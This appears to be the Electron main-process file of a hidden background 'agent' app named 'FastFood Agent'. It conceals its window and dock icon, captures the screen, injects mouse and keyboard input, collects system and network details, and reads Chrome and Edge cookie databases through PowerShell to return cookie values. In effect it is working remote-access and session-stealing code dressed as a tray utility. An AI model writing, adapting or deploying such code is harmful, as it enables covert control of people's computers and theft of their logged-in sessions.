const { app, BrowserWindow, ipcMain, desktopCapturer, screen, Tray, Menu, nativeImage } = require('electron');
const path = require('path');
const os = require('os');
const InputSimulator = require('./input-simulator');

let hiddenWindow;
let tray;
let inputSimulator;

// ── Icône tray minimale (16x16 PNG blanc) ──
const TRAY_ICON_B64 =
  'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAABHNCSVQICAgIfAhkiAAAAAlwSFlz' +
  'AAALEwAACxMBAJqcGAAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAABbSURB' +
  'VDiNY/z//z8DJYCJgUIwasCoAaMGjBowMAAA//8DAFBLAwQUAAAACAAAACEAAAAAAAAAAAAAAAoA' +
  'AAAAAAAAAA==';

function createTrayIcon() {
  try {
    const buf = Buffer.from(TRAY_ICON_B64, 'base64');
    let img = nativeImage.createFromBuffer(buf);
    if (img.isEmpty()) img = nativeImage.createEmpty();
    img.setTemplateImage(true);
    return img;
  } catch {
    return nativeImage.createEmpty();
  }
}

function buildTrayMenu(statusText) {
  return Menu.buildFromTemplate([
    { label: 'FastFood Agent', enabled: false },
    { type: 'separator' },
    { label: `Statut: ${statusText}`, id: 'status', enabled: false },
    { type: 'separator' },
    { label: 'Quitter', click: () => app.quit() }
  ]);
}

function createTray() {
  tray = new Tray(createTrayIcon());
  tray.setToolTip('FastFood Agent');
  tray.setContextMenu(buildTrayMenu('Démarrage...'));
}

function createHiddenWindow() {
  hiddenWindow = new BrowserWindow({
    width: 400,
    height: 300,
    show: false,
    skipTaskbar: true,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      webSecurity: false
    }
  });

  hiddenWindow.loadFile(path.join(__dirname, 'renderer', 'index.html'));

  hiddenWindow.on('closed', () => {
    hiddenWindow = null;
    if (inputSimulator) inputSimulator.destroy();
  });
}

// ── Masquer du dock macOS ──
if (process.platform === 'darwin' && app.dock) {
  app.dock.hide();
}

app.whenReady().then(() => {
  inputSimulator = new InputSimulator();
  createTray();
  createHiddenWindow();
});

// Rester actif même sans fenêtre visible
app.on('window-all-closed', () => {
  // Ne pas quitter — app de fond
});

// ── IPC ──

ipcMain.handle('get-screen-sources', async () => {
  const sources = await desktopCapturer.getSources({
    types: ['screen'],
    thumbnailSize: { width: 1, height: 1 }
  });
  return sources.map(s => ({ id: s.id, name: s.name }));
});

ipcMain.handle('get-screen-size', () => {
  const primary = screen.getPrimaryDisplay();
  return {
    width: primary.bounds.width,
    height: primary.bounds.height,
    scaleFactor: primary.scaleFactor
  };
});

ipcMain.handle('get-hostname', () => os.hostname());

ipcMain.handle('get-system-info', async () => {
  const ni = os.networkInterfaces();
  const ips = [];
  Object.values(ni).forEach(ifaces => {
    ifaces.forEach(i => { if (i.family === 'IPv4' && !i.internal) ips.push(i.address); });
  });
  return {
    hostname: os.hostname(),
    platform: os.platform(),
    release: os.release(),
    arch: os.arch(),
    cpus: os.cpus()[0]?.model || 'N/A',
    totalMem: Math.round(os.totalmem() / 1073741824) + ' GB',
    freeMem: Math.round(os.freemem() / 1073741824) + ' GB',
    uptime: Math.round(os.uptime() / 3600) + ' h',
    ips
  };
});

ipcMain.handle('get-cookies', async () => {
  const { exec } = require('child_process');
  const util = require('util');
  const execP = util.promisify(exec);
  const appdata = process.env.LOCALAPPDATA || '';
  const roaming = process.env.APPDATA || '';
  const paths = {
    'Chrome':  appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies',
    'Edge':    appdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies',
    'Firefox': roaming + '\\Mozilla\\Firefox\\Profiles'
  };
  const results = {};
  for (const [browser, p] of Object.entries(paths)) {
    try {
      const script = `
$db = '${p.replace(/'/g, "''")}';
if (Test-Path $db) {
  Add-Type -AssemblyName System.Data;
  $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$db;Version=3;");
  $conn.Open();
  $cmd = $conn.CreateCommand();
  $cmd.CommandText = "SELECT host_key, name, value FROM cookies LIMIT 200";
  $reader = $cmd.ExecuteReader();
  $rows = @();
  while ($reader.Read()) { $rows += "$($reader[0]) | $($reader[1]) | $($reader[2])" }
  $conn.Close();
  $rows -join "\\n"
} else { "Fichier introuvable: $db" }`;
      const { stdout } = await execP(`powershell -NoProfile -Command "${script.replace(/"/g, '\\"')}"`, { timeout: 8000 });
      results[browser] = stdout.trim();
    } catch (e) {
      results[browser] = 'Erreur: ' + e.message.slice(0, 100);
    }
  }
  return results;
});

ipcMain.on('execute-input', (_, event) => {
  const primary = screen.getPrimaryDisplay();
  const { width, height } = primary.bounds;
  inputSimulator.handleEvent(event, width, height);
});

ipcMain.on('status-update', (_, { text, controllers }) => {
  if (!tray) return;
  tray.setToolTip(`FastFood Agent — ${text}`);
  tray.setContextMenu(buildTrayMenu(text));
});

ipcMain.on('app-quit', () => app.quit());
